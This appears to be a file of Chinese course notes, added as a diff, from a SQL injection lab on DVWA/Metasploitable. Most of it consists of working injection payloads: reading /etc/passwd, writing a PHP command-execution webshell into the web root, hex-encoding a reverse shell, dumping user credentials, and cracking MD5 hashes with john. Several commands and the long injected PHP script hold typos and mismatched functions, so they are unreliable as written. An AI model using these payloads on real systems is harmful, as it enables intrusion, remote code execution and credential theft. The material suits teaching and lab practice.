@@ -1,0 +1,146 @@
+课时89 手动漏洞挖掘-SQL注入
+
+root@kali:~# john --format=raw-MD5 dvwa.txt
+
+root@kali:~# cd .john/
+
+root@kali:~/.john# ls
+john.log  john.pot
+
+root@kali:~/.john# cat john.log
+
+root@kali:~/.john# cat john.pot
+
+root@kali:~/.john# rm *       //删除破解日志，才能进行下面的工作
+
+root@kali:~/.john# john --format=raw-MD5 dvwa.txt
+
+手动漏洞挖掘-----SQL注入
+读取文件
+    'union SELECT null,load_file('/etc/passwd')--+
+写入文件
+    'union select null,"<?php passthru($_GET['cmd']);?>" INTO DUMPFILE "/var/www/a.php"--+
+    Mysql账号
+    cat php-revers-shell.php | xxd -ps | tr -d '\n'
+    'union select null, (0x3c3f706870) INTO DUMPFILE '/tmp/x.php'--
+保存下载数据库
+    'union select ull,concat(user,0x3a,password) from users INTO OUTFILE '/tmp/a.db'--
+
+root@kali:~# ssh msfadmin@192.168.1.103
+msfadmin@metasploitbale:~$ cd /var/
+
+msfadmin@metasploitbale:/var$ cd www/
+
+msfadmin@metasploitbale:/var/www$ ls
+1.php  dvwa       mutillidea   phpMyAdmin  tikiwiki    twiki
+dva    index.php  phpinfo.php  test        tikiwiki-old
+
+msfadmin@metasploitbale:/var/www/$ cd dvwa/
+
+msfadmin@metasploitbale:/var/www/dvwa$ ls
+about.php      dvwa         index.php         php.ini
+GHANGELOG.txt  external     instructions.php  README.txt
+config         favicon.ico  login.php         roubots.txt
+COPYING.txt    hackable     logout.php        security.php
+docs           ids_log.php  phpinfo.php       setup.php
+
+msfadmin@metasploitbale:/var/www/dvwa$ suodo find / -name a.php
+
+msfadmin@metasploitbale:/var/www/dvwa$ cd /var/lib/mysql/
+
+msfadmin@metasploitbale:/var/lib/mysql$ ls -l
+
+msfadmin@metasploitbale:/var/lib/mysql$ sudo -i
+
+root@metasploitbale:/var/lib/mysql/dvwa# ls
+a.php    guestbook.frm  gusetbook.MYI  users.MYD
+db.opt   guestbook.MYD  users.frm      users.MYI
+
+root@metasploitbale:/var/lib/mysql/dvwa# cat a.php
+<?php passthru($_GET['cmd']);?>root@metasploitbale:/var/lib/mysql/dvwa#
+
+root@metasploitbale:/var/lib/mysql/dvwa# ls -l
+
+root@metasploitbale:/var/lib/mysql/dvwa# cat /etc/passwd | grep mysql
+mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/lib/false
+
+root@metasploitbale:/var/lib/mysql/dvwa# cd /var/www/
+
+root@metasploitbale:/var/www# ls -ld /tmp
+
+root@metasploitbale:/var/www# cd /tmp/
+
+root@metasploitbale:/tmp# ls -l a.php 
+
+root@metasploitbale:/tmp# ps aux | grep mysql
+
+root@kali:~# cp /user/share/webshells/php/
+findsock.c               php-findsock-shell.php  qsd-php-backdoor.php
+php-backdoor.php         php-reverse-shell.php   simple-backdoor.php
+
+root@kali:~# cp /user/share/webshells/php/php-reverse-shell.php ./b.php
+
+root@kali:~# ls
+b.php  dvwa.txt  公共  模板  视频  图片  文档  下载  音乐  桌面
+
+root@kali:~# vi b.php
+
+root@kali:~# cat b.php
+
+root@kali:~# cat b.php | xxd -ps      固定一行显示
+
+root@kali:~# cat b.php | xxd -ps | tr -d '\n'          删除换行符
+
+root@metasploitbale:~# cd /tmp/
+
+root@metasploitbale:/tmp# cat a.php
+<?php passthru($_GET['cmd']);?>root@metasploitbale:/var/lib/mysql/dvwa#
+
+root@kali:~# vi c.php
+<?php passthru($_GET['cmd']);?>
+
+root@kali:~# cat c.php | xxd -ps | tr -d '\n'
+
+手动漏洞挖掘-----SQL注入
+一个思路: 编写服务器端代码
+    ‘union select null,'<?php if(isset($_POST["submit"])){$userID = $_POST["userID"];
+    $first_name = $_POST["first_name"];$last_name = $_POST["last_name"];$username =
+    $_POST["username"];$avatar = $_POST["avatar"]; echo "userID: $userID<BR>"; echo
+    "first_name: $first_name<BT>"; echo "last_name: $last_name<BR>"; echo "username:
+    $username<BR>"; echo "avatar: $avatar<BR>";
+    $con=mysqli_connect("127.0.0.1","root","dvwa"); if(mysql_connect_errno()) {echo
+    "Failed to connect to MYSQL:" .mysqli_connect_error();} else{echo "Connected to
+    database<BR>";} $password = "123"; $sql="insert into dvwa.users values
+    (\\"$userID\\",\\"$first_name\\",\\"$last_name\\",\\"$username\\",MD5(\\"$pass
+    word\\",\\"$avatar\\")"; if(mysqli_query($con,$sql)) {echo "[Successful Insertion]:
+    $sql";} else { echo "Error creating database:". mysql_error($con);}
+    mysql_close($con);} ?><form method="post" action="<?php echo
+    $_SERVER["PHP_SELF"];?>"><input type="text" name="userID" value="33"><br> <input
+    type="text" name="first_name" value="fh"><br> <input type="text" name="last_name"
+    value="y"><br> <input type="text" name="username" value="yfh"><br> <input
+    type="text" name="avatar" value"yfh"><br> <input type="submit" name="submit"
+    value="Submit Form"><br> </form>'INTO DUMPFILE'/tmp/user.php'--
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
